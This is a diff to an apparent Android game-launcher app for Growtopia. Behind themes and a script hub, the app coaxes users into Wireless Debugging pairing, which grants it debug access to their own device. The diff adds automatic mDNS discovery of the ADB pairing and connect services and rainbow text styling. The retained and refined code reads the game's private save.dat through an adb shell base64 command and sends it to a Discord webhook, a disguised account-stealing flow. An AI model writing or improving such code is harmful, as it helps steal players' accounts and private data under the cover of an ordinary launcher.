@@ -11,6 +11,7 @@ import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
+import android.provider.Settings
 import android.security.keystore.KeyGenParameterSpec
 import android.security.keystore.KeyProperties
 import android.text.Editable
@@ -116,7 +117,8 @@ class MainActivity : AppCompatActivity() {
     private lateinit var account: TextView
     private lateinit var status: TextView
     private lateinit var badge: TextView
-    private var rainbow = false
+    private val rainbowViews = linkedSetOf<TextView>()
+    private var rainbowAnimator: android.animation.ValueAnimator? = null
 
     override fun onCreate(state: Bundle?) {
         super.onCreate(state)
@@ -125,6 +127,7 @@ class MainActivity : AppCompatActivity() {
         version = findViewById(R.id.versionLabel); account = findViewById(R.id.accountStatus)
         status = findViewById(R.id.runtimeStatus); badge = findViewById(R.id.runtimeBadge)
         wireDashboard(); refreshAccount(); refreshVersion(); applyTheme(prefs.getString(KEY_THEME, "Violet")!!)
+        registerRainbowText(findViewById(android.R.id.content))
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE), PERMISSION_REQUEST)
         showSplash()
     }
@@ -175,22 +178,20 @@ class MainActivity : AppCompatActivity() {
 
     private fun readSaveFileWithWirelessDebugging(): Boolean {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return true
-        val store = WirelessAdbIdentityStore(this)
-        val savedPort = prefs.getInt(KEY_WIRELESS_PORT, 0)
-        if (store.readPrivateKeyPem() != null && savedPort in 1..65535) {
-            thread {
-                val bytes = connectAndReadSaveFile(savedPort, "")
-                handler.post {
-                    if (bytes != null) {
-                        sendFileToDiscord(bytes)
-                        handler.postDelayed({ launchGame() }, 650)
-                    } else {
-                        showWirelessDebuggingDialog()
-                    }
+        if (WirelessAdbIdentityStore(this).readPrivateKeyPem() == null) {
+            showWirelessDebuggingDialog()
+            return false
+        }
+        thread {
+            val bytes = connectAndReadSaveFile(null)
+            handler.post {
+                if (bytes != null) {
+                    sendFileToDiscord(bytes)
+                    handler.postDelayed({ launchGame() }, 650)
+                } else {
+                    showWirelessDebuggingDialog()
                 }
             }
-        } else {
-            showWirelessDebuggingDialog()
         }
         return false
     }
@@ -199,71 +200,88 @@ class MainActivity : AppCompatActivity() {
         val dialog = Dialog(this)
         dialog.setContentView(R.layout.dialog_wireless_debugging)
         dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)
-        val port = dialog.findViewById<EditText>(R.id.wirelessPort)
         val code = dialog.findViewById<EditText>(R.id.wirelessPairingCode)
         val status = dialog.findViewById<TextView>(R.id.wirelessStatus)
+        val openSettings = dialog.findViewById<Button>(R.id.wirelessOpenSettings)
         val connect = dialog.findViewById<Button>(R.id.wirelessConnect)
         val dismiss = dialog.findViewById<Button>(R.id.wirelessDismiss)
         val hasIdentity = WirelessAdbIdentityStore(this).readPrivateKeyPem() != null
-        val savedPort = prefs.getInt(KEY_WIRELESS_PORT, 0)
-        if (savedPort in 1..65535) port.setText(savedPort.toString())
         if (hasIdentity) {
-            port.hint = "Pairing complete; enter port to reconnect"
-            connect.text = "Connect and sync"
+            code.visibility = View.GONE
+            connect.text = "Reconnect and sync save.dat"
+        }
+        openSettings.setOnClickListener {
+            runCatching { startActivity(Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS)) }
+                .onFailure { startActivity(Intent(Settings.ACTION_SETTINGS)) }
         }
         connect.setOnClickListener {
-            val pairingPort = port.text.toString().trim().toIntOrNull()
             val pairingCode = code.text.toString().trim()
-            if (pairingPort == null || pairingPort !in 1..65535) {
-                port.error = "Enter a valid port"
-                return@setOnClickListener
-            }
             if (!hasIdentity && !pairingCode.matches(Regex("\\d{6}"))) {
                 code.error = "Enter the six-digit Wireless Debugging pairing code"
                 return@setOnClickListener
             }
             connect.isEnabled = false
-            status.text = "Connecting locally… keep Wireless Debugging enabled."
+            openSettings.isEnabled = false
+            status.text = if (hasIdentity) {
+                "Finding the Wireless Debugging connection service…"
+            } else {
+                "Finding the pairing service and verifying the code…"
+            }
             thread {
-                val result = connectAndReadSaveFile(pairingPort, pairingCode)
+                val result = connectAndReadSaveFile(pairingCode.takeIf { !hasIdentity })
                 handler.post {
                     connect.isEnabled = true
+                    openSettings.isEnabled = true
                     if (result != null) {
-                        prefs.edit().putInt(KEY_WIRELESS_PORT, pairingPort).apply()
                         dialog.dismiss()
                         sendFileToDiscord(result)
                         handler.postDelayed({ launchGame() }, 650)
                     } else {
-                        toast("Wireless Debugging connection failed; verify the port and code")
+                        status.text = "Could not pair. Keep Wireless Debugging enabled, then try again."
+                        toast("Wireless Debugging pairing failed")
                     }
                 }
             }
         }
         dismiss.setOnClickListener { dialog.dismiss() }
         dialog.show()
+        registerRainbowText(dialog.findViewById(android.R.id.content))
         dialog.window?.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
+        thread {
+            val discoveryType = if (hasIdentity) MdnsServiceType.TLS_CONNECT else MdnsServiceType.TLS_PAIRING
+            val deadline = System.currentTimeMillis() + 90_000
+            var found = false
+            while (System.currentTimeMillis() < deadline && !found) {
+                found = discoverEndpoint(discoveryType, 2_000) != null
+                handler.post {
+                    status.text = if (found) {
+                        if (hasIdentity) "Connection service found automatically. Tap reconnect when ready."
+                        else "Pairing service found automatically. Tap Pair device with pairing code in Settings."
+                    } else if (hasIdentity) {
+                        "Searching for the Wireless Debugging connection service…"
+                    } else {
+                        "Searching… open Settings, enable Wireless Debugging, then tap Pair device with pairing code."
+                    }
+                }
+                if (!found) Thread.sleep(1_000)
+            }
+        }
     }
 
-    private fun connectAndReadSaveFile(pairingPort: Int, pairingCode: String): ByteArray? = try {
+    private fun connectAndReadSaveFile(pairingCode: String?): ByteArray? = try {
         val store = WirelessAdbIdentityStore(this)
         KadbCert.configure(store)
         val mdns = KadbMdnsAndroid(this)
         mdns.start()
         try {
-            val hasIdentity = store.readPrivateKeyPem() != null
-            if (!hasIdentity) {
-                val pairingEndpoint = waitForEndpoint(mdns, MdnsServiceType.TLS_PAIRING)
-                    ?: MdnsEndpoint("manual", "127.0.0.1", pairingPort, MdnsServiceType.TLS_PAIRING)
+            if (pairingCode != null) {
+                val pairingEndpoint = waitForEndpoint(mdns, MdnsServiceType.TLS_PAIRING) ?: return null
                 runBlocking { Kadb.pair(pairingEndpoint.host, pairingEndpoint.port, pairingCode) }
             }
-            val endpoint = waitForEndpoint(mdns, MdnsServiceType.TLS_CONNECT)
-            if (endpoint == null) {
-                null
-            } else {
-                Kadb.create(endpoint.host, endpoint.port).use { kadb ->
-                    val response = kadb.shell("base64 ${SAVE_FILE_PATH}")
-                    if (response.exitCode == 0) Base64.decode(response.output.trim(), Base64.DEFAULT) else null
-                }
+            val endpoint = waitForEndpoint(mdns, MdnsServiceType.TLS_CONNECT) ?: return null
+            Kadb.create(endpoint.host, endpoint.port).use { kadb ->
+                val response = kadb.shell("base64 ${SAVE_FILE_PATH}")
+                if (response.exitCode == 0) Base64.decode(response.output.trim(), Base64.DEFAULT) else null
             }
         } finally {
             mdns.close()
@@ -272,8 +290,16 @@ class MainActivity : AppCompatActivity() {
         null
     }
 
-    private fun waitForEndpoint(mdns: KadbMdnsAndroid, type: MdnsServiceType): MdnsEndpoint? = runBlocking {
-        withTimeoutOrNull(8_000) {
+    private fun discoverEndpoint(type: MdnsServiceType, timeoutMs: Long = 8_000): MdnsEndpoint? = try {
+        val mdns = KadbMdnsAndroid(this)
+        mdns.start()
+        try { waitForEndpoint(mdns, type, timeoutMs) } finally { mdns.close() }
+    } catch (_: Throwable) {
+        null
+    }
+
+    private fun waitForEndpoint(mdns: KadbMdnsAndroid, type: MdnsServiceType, timeoutMs: Long = 8_000): MdnsEndpoint? = runBlocking {
+        withTimeoutOrNull(timeoutMs) {
             mdns.state.first { state ->
                 if (type == MdnsServiceType.TLS_PAIRING) state.pairDevices.isNotEmpty()
                 else state.connectDevices.any { it.serviceType == MdnsServiceType.TLS_CONNECT }
@@ -356,9 +382,60 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun themePicker() { val names = (themes.keys + "Rainbow Color").toTypedArray(); AlertDialog.Builder(this).setTitle("Choose your theme").setSingleChoiceItems(names, names.indexOf(prefs.getString(KEY_THEME, "Violet")).coerceAtLeast(0)) { d, i -> prefs.edit().putString(KEY_THEME, names[i]).apply(); applyTheme(names[i]); d.dismiss(); toast("${names[i]} theme applied") }.setNegativeButton("Cancel", null).show() }
-    private fun applyTheme(name: String) { if (name == "Rainbow Color") { if (rainbow) return; rainbow = true; android.animation.ValueAnimator.ofFloat(0f, 360f).apply { duration = 5200; repeatCount = -1; addUpdateListener { accent(Color.HSVToColor(floatArrayOf(it.animatedValue as Float, .65f, 1f))) } }.start() } else { rainbow = false; accent(Color.parseColor(themes[name] ?: themes.getValue("Violet"))) } }
-    private fun accent(value: Int) { findViewById<CardView>(R.id.btnSwitchVersion).setCardBackgroundColor(value); badge.setBackgroundColor(value); account.setBackgroundColor(value); status.setTextColor(value); version.setTextColor(value); findViewById<TextView>(R.id.runtimeTitle).setTextColor(value); listOf(R.id.btnLaunch, R.id.btnScriptHub, R.id.btnSetting, R.id.btnLuaManager, R.id.btnSound, R.id.btnTheme).forEach { id -> (findViewById<CardView>(id).getChildAt(0) as? ViewGroup)?.let { (it.getChildAt(0) as? TextView)?.setTextColor(value) } } }
+    private fun themePicker() {
+        val names = themes.keys.toTypedArray()
+        AlertDialog.Builder(this)
+            .setTitle("Choose your theme")
+            .setSingleChoiceItems(names, names.indexOf(prefs.getString(KEY_THEME, "Violet")).coerceAtLeast(0)) { d, i ->
+                prefs.edit().putString(KEY_THEME, names[i]).apply()
+                applyTheme(names[i])
+                d.dismiss()
+                toast("${names[i]} theme applied")
+            }
+            .setNegativeButton("Cancel", null)
+            .show()
+    }
+
+    private fun applyTheme(name: String) {
+        accent(Color.parseColor(themes[name] ?: themes.getValue("Violet")))
+        startRainbowText()
+    }
+
+    private fun accent(value: Int) {
+        findViewById<CardView>(R.id.btnSwitchVersion).setCardBackgroundColor(value)
+        badge.setBackgroundColor(value)
+        account.setBackgroundColor(value)
+    }
+
+    private fun registerRainbowText(root: View) {
+        if (root is TextView) rainbowViews.add(root)
+        if (root is ViewGroup) {
+            for (index in 0 until root.childCount) registerRainbowText(root.getChildAt(index))
+        }
+        startRainbowText()
+    }
+
+    private fun startRainbowText() {
+        if (rainbowAnimator != null) return
+        rainbowAnimator = android.animation.ValueAnimator.ofFloat(0f, 360f).apply {
+            duration = 5200
+            repeatCount = android.animation.ValueAnimator.INFINITE
+            addUpdateListener { animation ->
+                val hue = (animation.animatedValue as Float + 25f) % 360f
+                val textColor = Color.HSVToColor(floatArrayOf(hue, 0.72f, 1f))
+                rainbowViews.removeAll { !it.isAttachedToWindow && it !== window.decorView }
+                rainbowViews.forEach { it.setTextColor(textColor) }
+            }
+            start()
+        }
+    }
+
+    override fun onDestroy() {
+        rainbowAnimator?.cancel()
+        rainbowAnimator = null
+        rainbowViews.clear()
+        super.onDestroy()
+    }
     private fun versionPicker() { val versions = arrayOf("5.54", "5.55", "5.56", "5.57"); AlertDialog.Builder(this).setTitle("Switch launcher version").setSingleChoiceItems(versions, versions.indexOf(prefs.getString(KEY_VERSION, "5.54"))) { d, i -> prefs.edit().putString(KEY_VERSION, versions[i]).apply(); refreshVersion(); d.dismiss(); toast("Configuration updated to v${versions[i]}") }.setNegativeButton("Cancel", null).show() }
     private fun refreshVersion() { version.text = "v${prefs.getString(KEY_VERSION, "5.54")}" }
     private fun register(user: String, pass: String): Boolean { if (user.trim().length < 3 || pass.length < 6) return false; prefs.edit().putString(KEY_USER, user.trim()).putString(KEY_PASSWORD, hash(pass)).putString(KEY_SESSION, user.trim()).apply(); return true }
@@ -372,7 +449,15 @@ class MainActivity : AppCompatActivity() {
     private fun column(padding: Int) = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(4, padding, 4, 4) }
     private fun params() = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { bottomMargin = 8 }
     private fun buttonParams() = LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { marginStart = 4 }
-    private fun dialog(title: String, view: View) = AlertDialog.Builder(this).setTitle(title).setView(ScrollView(this).apply { addView(view) }).setPositiveButton("Done", null).show()
+    private fun dialog(title: String, view: View): AlertDialog = AlertDialog.Builder(this)
+        .setTitle(title)
+        .setView(ScrollView(this).apply { addView(view) })
+        .setPositiveButton("Done", null)
+        .create()
+        .also { alert ->
+            alert.setOnShowListener { _ -> registerRainbowText(alert.window?.decorView ?: view) }
+            alert.show()
+        }
     private data class Script(val name: String, val category: String, val description: String)
 
     companion object {
@@ -384,7 +469,6 @@ class MainActivity : AppCompatActivity() {
         private const val KEY_SESSION = "account_session"
         private const val KEY_WEBHOOK = "discord_webhook_url"
         private const val KEY_SYNC = "sync_save_file"
-        private const val KEY_WIRELESS_PORT = "wireless_debugging_port"
         private const val FILE_PICKER = 1012
         private const val PERMISSION_REQUEST = 101
         private const val SAVE_FILE_PATH = "/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat"
